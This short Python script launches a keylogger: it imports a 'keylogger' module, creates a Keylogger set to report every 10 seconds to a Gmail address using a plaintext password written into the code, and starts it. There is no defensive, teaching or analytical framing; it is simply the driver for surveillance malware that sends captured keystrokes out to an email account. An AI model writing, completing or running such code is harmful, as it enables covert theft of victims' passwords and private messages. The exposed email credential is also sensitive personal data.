#!/usr/bin/env/ python

import keylogger

my_keylogger = keylogger.Keylogger(interval=10, email="gvrotp@gmail.com", password="otp@12345")
my_keylogger.start()
